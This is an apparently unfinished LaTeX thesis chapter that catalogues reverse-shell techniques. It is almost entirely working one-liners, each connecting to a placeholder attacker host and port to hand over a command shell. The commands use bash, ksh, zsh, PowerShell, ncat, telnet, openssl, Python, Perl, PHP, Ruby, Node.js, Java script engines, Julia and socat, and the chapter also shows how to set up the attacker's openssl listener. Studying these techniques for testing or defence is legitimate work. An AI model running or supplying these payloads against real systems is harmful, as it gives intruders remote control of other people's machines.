\chapter{Methods of establishing a reverse shell}

\label{chap:methods}

In this chapter, we go through known methods and techniques of initializing a reverse shell from a remote server. Each method is characterized by a system tool, software, or a programming language with its interpreter/compiler (meaning they are not characterized by a concrete vulnerability in the security of the target). For each method, we show an actual example of how to run the tool/software, taking into account the testing environment described at the beginning of this chapter. Furthermore, we list all dependencies of the shown example, which are effectively minimal system requirements needed for a given method.

\section{Commands syntax and glossary}

\TODO{here should be explained what do keywords \shell, \host, \port mean and so on}


\section{Command-line interpreters}


\subsection{Bash (\texttt{bash})}

\begin{cmdline}{bash}{|}{bash}{}
bash -c '|\shell| >& /dev/tcp/|\host|/|\port| 0>&1'
\end{cmdline}

\begin{cmdline}{bash}{|}{bash}{}
bash -c 'exec 3<>/dev/tcp/|\host|/|\port|; 0<&3; |\shell| <&3 >&3 2>&3'
\end{cmdline}

\begin{cmdline}{bash}{^}{bash}{}
bash -c 'exec 3<>/dev/tcp/^\host^/^\port^; cat <&3 | while read line; do $line 2>&3 >&3; done'
\end{cmdline}
%$
\dpd{\texttt{cat}}


\subsection{KornShell (\texttt{ksh}/\texttt{ksh93})}

\begin{cmdline}{bash}{|}{ksh}{}
ksh -c '|\shell| > /dev/tcp/|\host|/|\port| 2>&1 0>&1'
\end{cmdline}
\notte{Support for network communication is a feature of the \texttt{ksh93} version of KornShell. The command won't work on \texttt{pdksh} shell.}


\subsection{Z shell (\texttt{zsh})}

\begin{cmdline}{bash}{|}{}{}
|\textcolor{highlight}{zsh}| -c 'zmodload zsh/net/tcp; ztcp -d 3 |\host| |\port|; |\shell| 0<&3 1>&3 2>&3'
\end{cmdline}
\dpd{\texttt{zsh/net/tcp.so} \footnote{usually located somewhere in \texttt{/usr/lib/}}}


\subsection{Scheme shell (\texttt{scsh})}


\subsection{PowerShell (\texttt{pwsh}/\texttt{powershell})}

\begin{cmdline}{bash}{|}{pwsh}{}
pwsh -c '$TCPClient = New-Object Net.Sockets.TCPClient("|\host|", |\port|); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()'
\end{cmdline}

\dpd{\texttt{pwsh.dll} \footnote{usually located in \texttt{/opt/microsoft/powershell/}}, .NET}


\subsection{Shells without native network support}

%\textit{Bourne shell} (\texttt{sh}) was a standard shell for the Version 7 Unix system but has been replaced by its advanced variants. On most modern Unix-like distributions, the original binary \texttt{/bin/sh} is just a link to another compatible shell. However, the POSIX specification for \texttt{sh} \cite{posix_sh} does not include built-in support for creating network connections; therefore, \texttt{sh} alone shouldn't be capable of spawning a reverse shell. Similarly, standard implementations of the \textit{Almquist shell} (\texttt{ash}) and the \textit{Debian Almquist shell} (\texttt{dash}) can also not use the network.

\begin{itemize}
\item Bourne shell (\texttt{sh}) -- standard shell for the Version 7 Unix system but has been replaced by its advanced variants; on most modern Unix-like distributions, the original binary \texttt{/bin/sh} is just a link to another compatible shell
\item Almquist shell (\texttt{ash}) and Debian Almquist shell (\texttt{dash})
\item C shell (\texttt{csh}) and TENEX C shell (\texttt{tcsh})
\item Friendly interactive shell (\texttt{fish})
\item rc shell (\texttt{rc})
\item Stand-alone shell (\texttt{sash})
\item Command Prompt (\texttt{cmd})
\end{itemize}


\section{Network tools}

\subsection{NetCat (\texttt{ncat}/\texttt{nc})}

\TODO{explain difference between \texttt{ncat} and \texttt{nc} and why one of them may not work on some systems}

\begin{cmdline}{bash}{|}{ncat}{}
ncat -e |\shell| |\host| |\port|
\end{cmdline}
\notte{Standard error output of executed commands is not redirected to the socket. Option \texttt{-c} (\texttt{-{}-sh-exec}) can be used instead of \texttt{-e} with the same syntax, but \texttt{/bin/sh} is needed in that case.}

\begin{cmdline}{bash}{^}{mkfifo,ncat}{}
mkfifo ^\tmp^; ^\shell^ < ^\tmp^ 2>&1 | ncat ^\host^ ^\port^ > ^\tmp^; rm ^\tmp^
\end{cmdline}
\dpd{\texttt{mkfifo}}

\subsection{Telnet (\texttt{telnet})}

\begin{cmdline}{bash}{^}{telnet}{}
telnet ^\host^ ^\port^ | ^\shell^ 2>&1 | telnet ^\host^ ^\portt^
\end{cmdline}
\notte{The socket with port number \port\ serves as standard input while the socket with port number \portt\ serves as standard output and standard error output.}

\begin{cmdline}{bash}{^}{mkfifo,telnet}{}
mkfifo ^\tmp^; ^\shell^ < ^\tmp^ 2>&1 | telnet ^\host^ ^\port^ > ^\tmp^; rm ^\tmp^
\end{cmdline}
\dpd{\texttt{mkfifo}}

\subsection{Socket (\texttt{socket})}

\begin{cmdline}{bash}{|}{socket}{}
socket -qvp '|\shell|' |\host| |\port|
\end{cmdline}
\TODO{dependencies}

\subsection{OpenSSL (\texttt{openssl})}

\begin{cmdline}{bash}{^}{mkfifo, openssl}{}
mkfifo ^\tmp^; ^\shell^ < ^\tmp^ 2>&1 | openssl s_client -quiet -connect ^\host^:^\port^ > ^\tmp^; rm ^\tmp^
\end{cmdline}
\TODO{dependencies}

\TODO{describe/explain commands that need to be run on attacker machine:}

\begin{cmdline}{bash}{|}{openssl}{}
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port |\port|
\end{cmdline}
\TODO{dependencies}


\section{Programming languages interpreters}

\subsection{Python (\texttt{python/python3})}

\begin{cmdline}{bash}{|}{python}{}
python -c 'import socket,subprocess,os; s = socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("|\host|",|\port|)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["|\shell|"]);'
\end{cmdline}
\TODO{dependencies}

\subsection{Perl (\texttt{perl})}

\begin{cmdline}{bash}{|}{perl}{}
perl -e 'use Socket; socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")); if(connect(S,sockaddr_in(|\port|,inet_aton("|\host|")))){ open(STDIN,">&S"); open(STDOUT,">&S"); open(STDERR,">&S"); exec("|\shell|");};'
\end{cmdline}
\TODO{dependencies}

\subsection{PHP (\texttt{php})}

\begin{cmdline}{bash}{|}{php}{}
php -r '$sock = fsockopen("|\host|",|\port|); exec("|\shell| <&3 >&3 2>&3");'
\end{cmdline}
%$
\TODO{dependencies}

\subsection{Ruby (\texttt{ruby})}

\begin{cmdline}{bash}{^}{ruby}{}
ruby -rsocket -e 'exit if fork; c = TCPSocket.new("^\host^",^\port^); while(cmd = c.gets); IO.popen(cmd,"r"){|io|c.print io.read} end'
\end{cmdline}
\TODO{dependencies}

\subsubsection{Interactive Ruby Shell (\texttt{irb})}

\begin{cmdline}{bash}{^}{echo,irb}{}
echo 'require "socket"; exit if fork; c = TCPSocket.new("^\host^",^\port^); while(cmd = c.gets); IO.popen(cmd,"r"){|io|c.print io.read} end' | irb
\end{cmdline}
\TODO{dependencies}

\subsection{JavaScript runtime environments}

\subsubsection{Node.js (\texttt{node})}

\begin{cmdline}{bash}{|}{node}{}
node -e 'shell = require("child_process").spawn("|\shell|"); require("net").connect(|\port|, "|\host|", function () { this.pipe(shell.stdin); shell.stdout.pipe(this); shell.stderr.pipe(this); })'
\end{cmdline}
\TODO{dependencies}

\subsubsection{Generic scripting engine (\texttt{jrunscript})}

\begin{cmdline}{bash}{^}{jrunscript}{}
jrunscript -e 'var p = new java.lang.ProcessBuilder("^\shell^").redirectErrorStream(true).start(); var s = new java.net.Socket("^\host^",^\port^); var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream(); var po = p.getOutputStream(), so = s.getOutputStream(); while(!s.isClosed()){ while(pi.available()>0) so.write(pi.read()); while(pe.available()>0) so.write(pe.read()); while(si.available()>0) po.write(si.read()); so.flush(); po.flush(); java.lang.Thread.sleep(50); try { p.exitValue(); break; } catch (e){}}; p.destroy(); s.close();'
\end{cmdline}
\TODO{dependencies}

\subsubsection{Nashorn engine (\texttt{jjs})}

\begin{cmdline}{bash}{^}{echo,jjs}{}
echo 'var p = new java.lang.ProcessBuilder("^\shell^").redirectErrorStream(true).start(); var s = new java.net.Socket("^\host^",^\port^); var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream(); var po = p.getOutputStream(), so = s.getOutputStream(); while(!s.isClosed()){ while(pi.available()>0) so.write(pi.read()); while(pe.available()>0) so.write(pe.read()); while(si.available()>0) po.write(si.read()); so.flush(); po.flush(); java.lang.Thread.sleep(50); try { p.exitValue(); break; } catch (e){}}; p.destroy(); s.close();' | jjs
\end{cmdline}
\TODO{dependencies}

\subsection{Julia (\texttt{julia})}

\begin{cmdline}{bash}{|}{julia}{}
julia -e 'using Sockets; sock = connect("|\host|", parse(Int64,"|\port|")); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'
\end{cmdline}
%$
\TODO{dependencies}

\section{Other tools}

\subsection{Socat (\texttt{socat})}

\begin{cmdline}{bash}{|}{socat}{}
socat tcp-connect:|\host|:|\port| exec:|\shell|,pty,stderr,setsid,sigint,sane
\end{cmdline}
\TODO{dependencies, explain "optional" settings (pty,stderr,...)}

\subsection{PIP (\texttt{pip}) \& Easy Install (\texttt{easy\_install})}
